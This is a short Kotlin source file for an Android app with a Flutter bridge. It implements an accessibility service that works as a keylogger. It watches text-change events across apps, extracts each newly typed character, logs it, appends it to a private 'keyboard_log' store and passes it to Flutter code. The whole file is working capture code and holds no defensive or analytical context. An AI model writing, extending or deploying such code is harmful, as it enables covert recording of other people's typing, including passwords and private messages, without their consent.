package com.example.edadeneme

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import io.flutter.plugin.common.MethodChannel
import android.content.Context
import android.content.SharedPreferences

class KeyboardAccessibilityService : AccessibilityService() {

    companion object {
        var channel: MethodChannel? = null
    }

    private var lastCapturedText = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val fullText = event.text.joinToString("")
            if (fullText.isNotBlank()) {
                val newChar = getNewChar(lastCapturedText, fullText)

                if (newChar.isNotEmpty()) {
                    Log.d("KeyboardService", "Captured char: $newChar")
                    saveTextToPrefs(this, newChar)
                    channel?.invokeMethod("onTextCaptured", newChar)
                }

                lastCapturedText = fullText
            }
        }
    }

    private fun getNewChar(oldText: String, newText: String): String {
        return if (oldText.isEmpty()) {
            newText // ilk karakterse direkt al
        } else if (newText.startsWith(oldText)) {
            newText.removePrefix(oldText)
        } else {
            ""
        }
    }

    private fun saveTextToPrefs(context: Context, text: String) {
        val prefs: SharedPreferences = context.getSharedPreferences("keyboard_log", Context.MODE_PRIVATE)
        val currentLog = prefs.getString("log", "") ?: ""
        prefs.edit().putString("log", currentLog + text).apply()
    }

    override fun onInterrupt() {}
}
